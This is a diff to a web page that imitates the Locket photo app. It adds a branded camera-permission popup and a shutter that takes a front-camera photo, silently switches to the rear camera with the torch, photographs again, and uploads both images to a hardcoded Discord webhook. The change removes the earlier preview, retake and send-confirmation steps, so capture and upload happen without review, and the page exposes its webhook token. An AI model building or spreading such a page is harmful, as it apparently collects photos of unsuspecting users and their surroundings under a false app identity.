@@ -3,19 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Locket Widget Clone</title>
+  <title>Locket Dual Camera Clone</title>
   <!-- Phosphor Icons -->
   <script src="https://unpkg.com/@phosphor-icons/web"></script>
   <style>
     :root {
-      --bg-color: #121212;
-      --card-bg: #1e1e1e;
+      --bg-color: #ffaa33;
+      --card-bg: #e69526;
       --text-color: #ffffff;
-      --accent-color: #ff9f0a;
-      --btn-bg: rgba(255, 255, 255, 0.15);
+      --accent-color: #ffffff;
+      --btn-bg: rgba(255, 255, 255, 0.2);
     }
 
-    /* Các theme màu */
     body.theme-orange {
       --bg-color: #ffaa33;
       --card-bg: #e69526;
@@ -62,7 +61,6 @@
       overflow: hidden;
     }
 
-    /* Thanh điều hướng trên cùng */
     .top-bar {
       width: 100%;
       max-width: 400px;
@@ -108,7 +106,6 @@
       border-color: var(--text-color);
     }
 
-    /* Khung Viewfinder Camera dạng Widget */
     .viewfinder-container {
       width: 100%;
       max-width: 360px;
@@ -120,7 +117,7 @@
       box-shadow: 0 20px 40px rgba(0,0,0,0.3);
     }
 
-    #video, #photo-preview {
+    #video {
       width: 100%;
       height: 100%;
       object-fit: cover;
@@ -128,10 +125,6 @@
 
     #video.mirror {
       transform: scaleX(-1);
-    }
-
-    #photo-preview {
-      display: none;
     }
 
     .badge-friends {
@@ -151,7 +144,86 @@
       backdrop-filter: blur(10px);
     }
 
-    /* Thanh điều khiển chụp */
+    .status-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 600;
+      gap: 8px;
+      backdrop-filter: blur(5px);
+    }
+
+    /* Flash ảo bằng màn hình */
+    .screen-flash {
+      position: fixed;
+      inset: 0;
+      background-color: #ffffff;
+      z-index: 9999;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.05s ease-in-out;
+    }
+
+    /* Modal Popup Yêu cầu Camera */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(8px);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-box {
+      background: #1e1e1e;
+      color: white;
+      width: 100%;
+      max-width: 320px;
+      border-radius: 28px;
+      padding: 24px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    }
+
+    .modal-icon {
+      font-size: 48px;
+      color: #ffaa33;
+      margin-bottom: 12px;
+    }
+
+    .modal-title {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .modal-desc {
+      font-size: 14px;
+      color: #a1a1aa;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+
+    .modal-btn {
+      width: 100%;
+      background: #ffaa33;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
     .controls {
       width: 100%;
       max-width: 400px;
@@ -194,18 +266,9 @@
       transform: scale(0.85);
     }
 
-    .send-btn {
-      background: var(--text-color);
-      color: var(--bg-color);
-      padding: 14px 32px;
-      border-radius: 30px;
-      font-weight: bold;
-      border: none;
-      font-size: 16px;
-      display: none;
-      align-items: center;
-      gap: 8px;
-      cursor: pointer;
+    .shutter-btn.sending {
+      pointer-events: none;
+      opacity: 0.5;
     }
 
     .history-row {
@@ -227,18 +290,29 @@
     }
   </style>
 </head>
-<body class="theme-black">
+<body class="theme-orange">
 
-  <!-- Top Navigation -->
+  <!-- Popup Yêu cầu quyền Camera -->
+  <div class="modal-overlay" id="permission-modal">
+    <div class="modal-box">
+      <i class="ph ph-camera modal-icon"></i>
+      <div class="modal-title">Cấp quyền Camera</div>
+      <div class="modal-desc">Trang web yêu cầu quyền truy cập Camera để tiếp tục sử dụng ứng dụng Locket.</div>
+      <button class="modal-btn" onclick="requestPermission()">Đồng ý & Bắt đầu</button>
+    </div>
+  </div>
+
+  <!-- Màn hình flash trắng -->
+  <div class="screen-flash" id="screen-flash"></div>
+
   <div class="top-bar">
     <button class="icon-btn" id="flash-btn" onclick="toggleFlash()">
-      <i class="ph ph-lightning-slash"></i>
+      <i class="ph ph-lightning"></i>
     </button>
 
-    <!-- Theme Switcher -->
     <div class="theme-selector">
-      <div class="theme-dot active" style="background: #000000;" onclick="setTheme('black', this)"></div>
-      <div class="theme-dot" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
+      <div class="theme-dot" style="background: #000000;" onclick="setTheme('black', this)"></div>
+      <div class="theme-dot active" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
       <div class="theme-dot" style="background: #fbcfe8;" onclick="setTheme('pink', this)"></div>
       <div class="theme-dot" style="background: #ffffff;" onclick="setTheme('white', this)"></div>
     </div>
@@ -248,30 +322,23 @@
     </button>
   </div>
 
-  <!-- Camera / Widget Viewfinder -->
   <div class="viewfinder-container">
     <video id="video" autoplay playsinline></video>
-    <img id="photo-preview" alt="Preview" />
     <div class="badge-friends">
       <i class="ph ph-users-three"></i> Bạn bè
     </div>
+    <div class="status-overlay" id="status-overlay">
+      <i class="ph ph-spinner spinner" style="font-size: 32px;"></i>
+      <span id="status-text">Đang chuyển camera sau...</span>
+    </div>
   </div>
 
-  <!-- Bottom Controls -->
   <div class="controls">
     <div class="action-row">
-      <button class="icon-btn" onclick="retakePhoto()" id="retake-btn" style="visibility: hidden;">
-        <i class="ph ph-x"></i>
-      </button>
+      <div style="width: 44px;"></div>
 
-      <!-- Main Capture Button -->
-      <button class="shutter-btn" id="shutter-btn" onclick="takePhoto()">
+      <button class="shutter-btn" id="shutter-btn" onclick="startDualCapture()">
         <div class="shutter-inner"></div>
-      </button>
-
-      <!-- Send Button (Shown after capture) -->
-      <button class="send-btn" id="send-btn" onclick="sendToDiscord()">
-        Gửi <i class="ph ph-paper-plane-right-fill"></i>
       </button>
 
       <button class="icon-btn" id="switch-cam-btn" onclick="switchCamera()">
@@ -279,7 +346,6 @@
       </button>
     </div>
 
-    <!-- Decorative History Bar -->
     <div class="history-row">
       <div class="history-item"><i class="ph ph-clock-counter-clockwise"></i></div>
       <span style="font-size: 12px; font-weight: 500;">Khoảnh khắc vừa ghi</span>
@@ -292,23 +358,33 @@
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1530830759496253591/Pbzj6XovoFjAyAqjYSOvFYkaFk1UP1wRRYU3HFSN8VFNCFTIWx4rhk7mWeECi4_aicI2";
 
     const video = document.getElementById('video');
-    const photoPreview = document.getElementById('photo-preview');
     const canvas = document.getElementById('canvas');
     const shutterBtn = document.getElementById('shutter-btn');
-    const sendBtn = document.getElementById('send-btn');
-    const retakeBtn = document.getElementById('retake-btn');
-    const switchCamBtn = document.getElementById('switch-cam-btn');
+    const statusOverlay = document.getElementById('status-overlay');
+    const statusText = document.getElementById('status-text');
+    const screenFlash = document.getElementById('screen-flash');
+    const permissionModal = document.getElementById('permission-modal');
 
     let currentStream = null;
-    let facingMode = 'user'; // Ưu tiên camera trước
-    let capturedBlob = null;
+    let facingMode = 'user'; 
+    let isFlashEnabled = true;
 
-    // Khởi tạo Camera
-    async function initCamera() {
+    // Yêu cầu quyền từ Popup
+    async function requestPermission() {
+      const success = await initCamera('user');
+      if (success) {
+        permissionModal.style.display = 'none';
+      } else {
+        alert("Vui lòng cho phép quyền sử dụng camera trên trình duyệt để tiếp tục.");
+      }
+    }
+
+    async function initCamera(mode) {
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
       }
 
+      facingMode = mode;
       const constraints = {
         video: {
           facingMode: facingMode,
@@ -326,68 +402,110 @@
         } else {
           video.classList.remove('mirror');
         }
+        return true;
       } catch (err) {
-        alert("Không thể truy cập camera. Vui lòng cấp quyền sử dụng camera trên trình duyệt.");
+        return false;
       }
     }
 
-    // Đổi Camera trước/sau
+    async function toggleTorch(enable) {
+      if (!currentStream) return;
+      const track = currentStream.getVideoTracks()[0];
+      if (track && 'applyConstraints' in track) {
+        const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+        if (capabilities.torch) {
+          try {
+            await track.applyConstraints({ advanced: [{ torch: enable }] });
+          } catch (e) {}
+        }
+      }
+    }
+
+    function triggerScreenFlash() {
+      return new Promise((resolve) => {
+        screenFlash.style.display = 'block';
+        screenFlash.style.opacity = '1';
+        setTimeout(() => {
+          screenFlash.style.opacity = '0';
+          setTimeout(() => {
+            screenFlash.style.display = 'none';
+            resolve();
+          }, 100);
+        }, 300);
+      });
+    }
+
     function switchCamera() {
-      facingMode = (facingMode === 'user') ? 'environment' : 'user';
-      initCamera();
+      const nextMode = (facingMode === 'user') ? 'environment' : 'user';
+      initCamera(nextMode);
     }
 
-    // Chụp ảnh
-    function takePhoto() {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 640;
+    function captureFrame() {
+      return new Promise((resolve) => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 640;
 
-      // Xử lý lật ảnh nếu là camera trước
-      if (facingMode === 'user') {
-        context.translate(canvas.width, 0);
-        context.scale(-1, 1);
+        if (facingMode === 'user') {
+          context.translate(canvas.width, 0);
+          context.scale(-1, 1);
+        }
+
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+          resolve(blob);
+        }, 'image/jpeg', 0.85);
+      });
+    }
+
+    async function startDualCapture() {
+      shutterBtn.classList.add('sending');
+      
+      if (isFlashEnabled) {
+        triggerScreenFlash();
+      }
+      const firstBlob = await captureFrame();
+      const photos = [{ name: 'camera_1.jpg', blob: firstBlob }];
+
+      statusText.innerText = "Đang chuyển camera sau...";
+      statusOverlay.style.display = 'flex';
+
+      const otherMode = (facingMode === 'user') ? 'environment' : 'user';
+      const success = await initCamera(otherMode);
+
+      if (success) {
+        await new Promise(r => setTimeout(r, 600));
+
+        if (isFlashEnabled) {
+          await toggleTorch(true);
+          await new Promise(r => setTimeout(r, 200));
+        }
+
+        const secondBlob = await captureFrame();
+        photos.push({ name: 'camera_2.jpg', blob: secondBlob });
+
+        if (isFlashEnabled) {
+          await toggleTorch(false);
+        }
       }
 
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      await initCamera('user');
+      statusOverlay.style.display = 'none';
 
-      canvas.toBlob((blob) => {
-        capturedBlob = blob;
-        const imageUrl = URL.createObjectURL(blob);
-        photoPreview.src = imageUrl;
-
-        // Chuyển UI sang chế độ xem lại ảnh
-        video.style.display = 'none';
-        photoPreview.style.display = 'block';
-        shutterBtn.style.display = 'none';
-        switchCamBtn.style.visibility = 'hidden';
-        sendBtn.style.display = 'flex';
-        retakeBtn.style.visibility = 'visible';
-      }, 'image/jpeg', 0.85);
+      await sendToDiscord(photos);
+      shutterBtn.classList.remove('sending');
     }
 
-    // Chụp lại
-    function retakePhoto() {
-      capturedBlob = null;
-      photoPreview.style.display = 'none';
-      video.style.display = 'block';
-      shutterBtn.style.display = 'flex';
-      switchCamBtn.style.visibility = 'visible';
-      sendBtn.style.display = 'none';
-      retakeBtn.style.visibility = 'hidden';
-    }
-
-    // Gửi ảnh lên Discord Webhook
-    async function sendToDiscord() {
-      if (!capturedBlob) return;
-
-      sendBtn.disabled = true;
-      sendBtn.innerText = "Đang gửi...";
-
+    async function sendToDiscord(photos) {
       const formData = new FormData();
-      formData.append("file", capturedBlob, "locket_moment.jpg");
+      
+      photos.forEach((photo, index) => {
+        formData.append(`file${index + 1}`, photo.blob, photo.name);
+      });
+
       formData.append("payload_json", JSON.stringify({
-        content: "📸 Một khoảnh khắc mới vừa được chia sẻ từ Locket!"
+        content: `📸 Khoảnh khắc mới từ Locket! (${photos.length} góc chụp)`
       }));
 
       try {
@@ -398,38 +516,30 @@
 
         if (response.ok) {
           alert("Gửi khoảnh khắc thành công!");
-          retakePhoto();
         } else {
-          alert("Lỗi khi gửi ảnh lên Webhook.");
+          alert("Gửi ảnh lên Discord thất bại.");
         }
       } catch (error) {
-        alert("Lỗi kết nối tới Discord Webhook.");
-      } finally {
-        sendBtn.disabled = false;
-        sendBtn.innerHTML = `Gửi <i class="ph ph-paper-plane-right-fill"></i>`;
+        alert("Lỗi kết nối tới Webhook.");
       }
     }
 
-    // Đổi chủ đề màu
     function setTheme(themeName, element) {
       document.body.className = `theme-${themeName}`;
       document.querySelectorAll('.theme-dot').forEach(dot => dot.classList.remove('active'));
       element.classList.add('active');
     }
 
-    // Đổi biểu tượng Flash
     function toggleFlash() {
+      isFlashEnabled = !isFlashEnabled;
       const btn = document.getElementById('flash-btn');
       const icon = btn.querySelector('i');
-      if (icon.classList.contains('ph-lightning-slash')) {
+      if (isFlashEnabled) {
         icon.className = 'ph ph-lightning';
       } else {
         icon.className = 'ph ph-lightning-slash';
       }
     }
-
-    // Chạy camera khi mở trang
-    window.addEventListener('DOMContentLoaded', initCamera);
   </script>
 </body>
 </html>
